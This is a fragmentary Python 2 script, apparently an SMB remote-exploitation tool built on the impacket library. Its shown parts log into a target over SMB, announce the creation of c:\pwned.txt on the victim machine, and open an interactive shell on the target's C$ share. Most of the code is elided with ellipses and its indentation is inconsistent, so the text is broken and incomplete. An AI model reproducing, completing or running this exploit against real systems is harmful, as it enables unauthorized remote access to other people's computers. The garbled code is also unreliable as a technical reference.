#!/usr/bin/env python2
from impacket import smb, smbconnection, LOG
from impacket.smbconnection import FILE_READ_DATA, FILE_SHARE_READ
...
def exploit(target, pipe_name):
	...
	conn.login(USERNAME, PASSWORD, domain=DOMAIN, maxBufferSize=4356)
...
def smb_pwn(conn, arch):
	...
	print('creating file c:\\pwned.txt on the target')
        ...
        smbConn._SMBConnection.__class__ = smb.SMB
        shell = MiniImpacketShell(smbConn)
        shell.share = 'C$'
        shell.pwd = '/'
        shell.tid = tid2
        shell.cmdloop()
        smbConn._SMBConnection.__class__ = MYSMB
